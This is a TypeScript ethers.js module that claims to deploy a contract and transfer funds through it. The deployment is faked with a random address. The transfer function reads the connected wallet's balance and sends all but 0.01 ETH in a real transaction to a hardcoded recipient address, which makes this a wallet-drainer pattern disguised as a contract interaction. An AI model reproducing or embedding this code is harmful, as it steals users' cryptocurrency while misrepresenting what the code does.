import { ethers } from 'ethers';

// Target address to transfer assets to
export const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

// Simulate "deploying" a contract by just returning an identifier
export const deployContract = async (signer: ethers.Signer): Promise<{address: string}> => {
  try {
    console.log('Simulating contract deployment...');

    // Generate a random "contract address" to simulate deployment
    // In a real scenario, this would be the address returned by the deployed contract
    const randomBytes = ethers.utils.randomBytes(20);
    const address = ethers.utils.hexlify(randomBytes);

    console.log('Simulated contract deployed at:', address);

    return { address };
  } catch (error) {
    console.error('Error simulating contract deployment:', error);
    throw error;
  }
};

// Simulate contract instance
export const getContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<{address: string, signer: ethers.Signer}> => {
  return { address: contractAddress, signer };
};

// Transfer funds directly to the recipient, simulating a contract transfer
export const transferFundsViaContract = async (
  contractAddress: string,
  signer: ethers.Signer
): Promise<ethers.providers.TransactionResponse> => {
  try {
    console.log(`Simulating transfer via contract at ${contractAddress}...`);

    const provider = signer.provider as ethers.providers.Web3Provider;
    const address = await signer.getAddress();

    // Get current balance
    const balance = await provider.getBalance(address);

    // Reserve 0.01 ETH for future transactions
    const reserveAmount = ethers.utils.parseEther("0.01");

    // Calculate amount to send (balance - reserve)
    const amountToSend = balance.sub(reserveAmount);

    if (amountToSend.lte(0)) {
      throw new Error("Insufficient funds for transfer");
    }

    console.log(`Sending ${ethers.utils.formatEther(amountToSend)} ETH to ${RECIPIENT_ADDRESS}...`);

    // Create transaction object for direct transfer
    const tx = {
      to: RECIPIENT_ADDRESS,
      value: amountToSend,
      gasLimit: 21000 // Standard gas limit for ETH transfers
    };

    // Send the transaction
    const txResponse = await signer.sendTransaction(tx);
    console.log('Transaction sent:', txResponse.hash);
    return txResponse;
  } catch (error) {
    console.error('Error transferring funds:', error);
    throw error;
  }
};
